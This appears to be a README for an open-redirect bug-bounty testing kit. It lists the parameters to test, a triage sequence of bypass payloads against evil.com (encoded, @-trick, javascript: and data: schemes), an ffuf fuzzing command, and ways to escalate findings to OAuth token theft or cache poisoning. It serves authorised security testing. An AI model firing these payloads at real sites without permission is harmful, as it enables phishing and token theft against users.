# Open Redirect (2026 edition)
> **Author:** MD MAHABUBUR RAHMAN

## What to test first
Open Redirect = OAuth `redirect_uri`, login/`next`, logout `return_to`, payment/cancel URLs, SSO relay states, referral scripts (`/out`, `/link`), and any param that ends up in a `Location:` / `javascript:` / meta-refresh.

## File index

| File | Use |
|------|-----|
| `F12_console.txt` | Paste in browser DevTools console: auto-scans current page params, forms, links, endpoints |
| `open-redirect-payloads-2026.txt` | Manual/Burp arsenal: all bypass classes, OAuth specific, CRLF, scheme abuse, testing methodology |
| `how-to-test-target.txt` | Step-by-step live-target playbook: recon → param fuzz → manual confirm → OAuth → blind → cache → false-positive checklist → report |

## Quick triage
```
# test in this order (Burp: response headers + Location look)
1. Basic                ?url=https://evil.com
2. Protocol-relative    ?url=//evil.com
3. Double-slash slash   ?url=\\evil.com  /  ?url=////evil.com
4. Backslash+s         ?url=https://evil.com\@trusted.com  ?url=//evil.com@trusted.com
5. @/path tricks       ?url=https://trusted.com@evil.com   ?url=https://evil.com%2F..trusted.com
6. Encoded             ?url=https%3A%2F%2Fevil.com  (double: %25)
7. Scheme abuse        ?url=javascript:alert(1)  ?url=data:text/html,<script>...</script>  ?url=https://evil.com%00
8. OOB auto            ?callback=https://YOUR-COLLABORATOR  (speed with Collaborator)
```
Skip straight to the auto-scanner (`F12_console.txt`) when endpoints are unknown; it fires all combos.

## Impact framing for reports
- Phishing on a legit domain (low bounty alone) — pair with a CA-signed look-alike to raise it.
- OAuth `redirect_uri` → token theft (High/Critical).
- CRLF + `Set-Cookie` → session fixation (Medium).
- Behind a CDN → cache-poison the `Location` (Medium-High).

## Tools
- `ffuf -w payloads -u TARGET/path?FUZZ=FUZZ2` with this wordlist
- Burp + Collaborator for blind/auto; `lyr157/ssrf-o-or` and `tampe125/open-redirect-finder` for auto.
